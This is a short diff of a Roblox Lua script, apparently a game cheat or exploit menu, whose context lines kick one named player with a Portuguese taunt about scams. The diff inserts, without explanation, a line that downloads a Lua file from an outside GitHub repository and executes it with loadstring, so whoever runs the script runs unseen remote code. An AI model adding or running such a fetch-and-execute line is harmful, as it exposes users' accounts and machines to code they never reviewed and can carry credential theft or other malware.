@@ -428,6 +428,8 @@ if game.Players.LocalPlayer.Name == "mayconOM12" then
 game.Players.LocalPlayer:Kick("Foi Bom Vida Mais Scams N Podem Dura rs")
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/refs/heads/main/Lol.lua"))()
+
 if game.PlaceId ~= 7449423635 and game.PlaceId ~= 4442272183 and game.PlaceId ~= 2753915549 then
 if not game.CoreGui:FindFirstChild("ThunderScreen") then
 local ThunderScreen = Instance.new("ScreenGui")
